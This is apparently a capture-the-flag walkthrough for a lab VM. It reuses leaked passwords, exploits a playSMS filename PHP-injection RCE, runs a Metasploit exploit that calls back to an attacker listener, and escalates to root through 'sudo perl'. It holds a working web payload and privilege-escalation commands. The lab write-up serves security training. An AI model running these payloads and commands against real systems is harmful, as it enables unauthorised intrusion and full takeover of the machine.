lets go to http://192.168.1.9/robots.txt

User-agent: *
Disallow: /ange1
Disallow: /angel1
Disallow: /nothing
Disallow: /tmp
Disallow: /uploads

there is nothing in ange1 and angel2

in the source page on /nothing directory I found this

<!--
#my secret pass
freedom
password
helloworld!
diana
iloveroot
-->

also in /secure directory that dirb has found there is a zip file

downlaod that zip file , it is password protected and we will use passwords we found in
/nothing directory

password is freedom 
extract file inside zip file

and try to read it

$ strings backup-cred.mp3 

I am not toooo smart in computer .......dat the resoan i always choose easy password...with creds backup file....
uname: touhid
password: ******
url : /SecreTSMSgatwayLogin

we found a secret login page

lets go to the secret url

and wee see login page 
I tried touhid with password combinations and I found thath password is diana

no we go to the admin panel of playSMS page

After a little bit of googling I found https://touhidshaikh.com/blog/2017/05/playsms-v1-4-rce/

about rce in playsms

it is in file name

 go to accound->send from file
 create a file named  file.<?php system("id");?>.png
 
 upload the file 
 
 and you see that we executed the code

I tried a lot to get a reverse shell from filename but I wasnt able to do

so I decided to use metasploit to exploit this vulnerability

$ msfconsole 
$ search playsms

and with use command select the exploit to use

$ set PASSWORD diana
$ set USERNAME touhid
$ set RHOST 192.168.1.9
$ set LHOST 192.168.1.67
$ set TARGETURI /SecreTSMSgatwayLogin

and finally $ run

now we meterpreter

to use a system shell 
type shell
 	


first thing I do is to run $ sudo -l


Matching Defaults entries for www-data on this host:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/perl

this means we can use sudo command with  perl to get a shell

sudo perl -e 'exec("/bin/bash")'
whoami 
root

cd /root
cat flag.txt

root password is : hello@3210
easy one .....but hard to guess.....
but i think u dont need root password......
u already have root shelll....
